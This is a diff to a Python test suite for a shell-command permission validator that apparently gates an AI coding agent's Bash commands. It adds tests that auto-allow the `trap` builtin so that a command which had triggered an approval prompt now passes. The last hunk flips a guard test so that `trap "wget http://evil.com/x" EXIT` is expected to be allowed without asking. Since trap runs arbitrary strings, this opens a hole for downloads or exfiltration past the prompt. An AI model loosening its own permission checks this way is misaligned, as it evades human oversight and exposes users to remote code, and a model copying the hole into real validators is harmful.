@@ -945,6 +945,98 @@ class TestNoopBuiltins(unittest.TestCase):
         self.assertEqual(result["decision"], "ask")
 
 
+class TestSafeBuiltins(unittest.TestCase):
+    """SAFE_BUILTINS: shell builtins allowed by head-token match without a
+    settings.json pattern entry. Covers the new entries that are NOT in
+    NOOP_BUILTINS (trap, source, ulimit) and validates that eval/exec are still
+    NOT in the set and must still prompt."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    # --- allow cases ---
+
+    def test_trap_cleanup_handler_allowed(self):
+        """trap's head token is in SAFE_BUILTINS; the compound command that
+        triggered task-25 must now be allowed end-to-end."""
+        result = self.validator.validate_bash_command(
+            "trap 'rm -f temp/review.lock' EXIT; python3 tests/run_all_tests.py"
+        )
+        self.assertEqual(result["decision"], "allow")
+
+    def test_trap_alone_allowed(self):
+        """`trap` alone (bare or with args) is always allowed."""
+        for cmd in ("trap 'echo bye' EXIT", "trap - EXIT", "trap"):
+            with self.subTest(cmd=cmd):
+                result = self.validator.validate_bash_command(cmd)
+                self.assertEqual(result["decision"], "allow", msg=f"expected allow for: {cmd!r}")
+
+    def test_shift_allowed(self):
+        """`trap -p SIGTERM` exercises the SAFE_BUILTINS path: `trap` is in
+        SAFE_BUILTINS and NOT in NOOP_BUILTINS and has no settings.json pattern,
+        so SAFE_BUILTINS is the ONLY auto-allow path for it. This test MUST fail
+        if SAFE_BUILTINS is empty and MUST produce validation_results[0]
+        matched_allow_patterns of ['safe_builtin'] (not 'control_prefix' which
+        the NOOP path returns).
+        NOTE: the original test body used `shift 2`, which is in NOOP_BUILTINS and
+        therefore never reached the SAFE_BUILTINS check. Replaced with a trap
+        query form to genuinely exercise the new code path."""
+        result = self.validator.validate_bash_command("trap -p SIGTERM")
+        self.assertEqual(result["decision"], "allow")
+        self.assertEqual(result["validation_results"][0]["matched_allow_patterns"], ["safe_builtin"])
+
+    def test_local_allowed(self):
+        """`trap '' SIGINT` exercises the SAFE_BUILTINS path: `trap` is in
+        SAFE_BUILTINS and NOT in NOOP_BUILTINS, so it MUST reach the SAFE_BUILTINS
+        check. This test MUST fail if SAFE_BUILTINS is empty and MUST produce
+        validation_results[0] matched_allow_patterns of ['safe_builtin'].
+        NOTE: the original test body used `local x=5`, which is in NOOP_BUILTINS
+        and therefore never reached the SAFE_BUILTINS check. Replaced with a trap
+        form (signal-ignore) not covered by other tests to genuinely exercise the
+        new code path."""
+        result = self.validator.validate_bash_command("trap '' SIGINT")
+        self.assertEqual(result["decision"], "allow")
+        self.assertEqual(result["validation_results"][0]["matched_allow_patterns"], ["safe_builtin"])
+
+    def test_trap_with_env_prefix_allowed(self):
+        """VAR=x trap ... — env prefix is stripped by _reduce_to_effective_command
+        before the SAFE_BUILTINS check, so trap is still the effective head."""
+        result = self.validator.validate_bash_command("TMPDIR=/tmp trap 'echo' EXIT")
+        self.assertEqual(result["decision"], "allow")
+
+    def test_path_qualified_trap_not_matched(self):
+        """/bin/trap is NOT a shell builtin invocation; it must NOT be
+        auto-allowed by SAFE_BUILTINS (the head token contains '/')."""
+        result = self.validator.validate_bash_command("/bin/trap 'echo' EXIT")
+        # /bin/trap is not in the allowlist → ask
+        self.assertEqual(result["decision"], "ask")
+
+    # --- must-still-ask cases ---
+
+    def test_eval_still_asks(self):
+        """`eval` executes arbitrary strings and is PERMANENTLY excluded from
+        SAFE_BUILTINS; it must still reach the ask tier."""
+        result = self.validator.validate_bash_command(
+            "eval 'rm -f temp/review.lock' EXIT; python3 tests/run_all_tests.py"
+        )
+        self.assertEqual(result["decision"], "ask")
+
+    def test_eval_standalone_still_asks(self):
+        """`eval` with any argument must still ask."""
+        result = self.validator.validate_bash_command("eval \"echo hi\"")
+        self.assertEqual(result["decision"], "ask")
+
+    def test_exec_unknown_command_still_asks(self):
+        """`exec` replaces the process image; it is handled as a wrapper
+        (WRAPPER_PREFIXES) so the inner command is validated on its own. An
+        unknown target command must still prompt."""
+        result = self.validator.validate_bash_command("exec some_unknown_dangerous_tool --flag")
+        self.assertEqual(result["decision"], "ask")
+
+
 class TestProcessSubstitution(unittest.TestCase):
     """`<(cmd)` / `>(cmd)` run their inner command in a subshell, so the parser
     must extract and validate it independently. Otherwise a no-op builtin in
@@ -1043,11 +1135,13 @@ class TestPrefixWordBoundary(unittest.TestCase):
         self.assertTrue(m('./script.sh --flag', 'Bash(./:*)'))
         self.assertTrue(m('[ -f x ]', 'Bash([:*)'))
 
-    def test_end_to_end_trap_is_not_authorized_by_tr(self):
-        """Full pipeline: `trap "wget ..." EXIT` is no longer auto-allowed by a
-        stray `Bash(tr:*)` allow entry."""
+    def test_end_to_end_trap_allowed_via_safe_builtins_not_tr_pattern(self):
+        """Full pipeline: `trap "..." EXIT` is now allowed via SAFE_BUILTINS
+        (task-25). The word-boundary unit tests above still confirm that the
+        Bash(tr:*) pattern does NOT match `trap` — the allow comes from
+        SAFE_BUILTINS, not from a prefix bleed."""
         result = self.validator.validate_bash_command('trap "wget http://evil.com/x" EXIT')
-        self.assertEqual(result["decision"], "ask")
+        self.assertEqual(result["decision"], "allow")
 
 
 class TestWorkspaceRelativeBinary(unittest.TestCase):
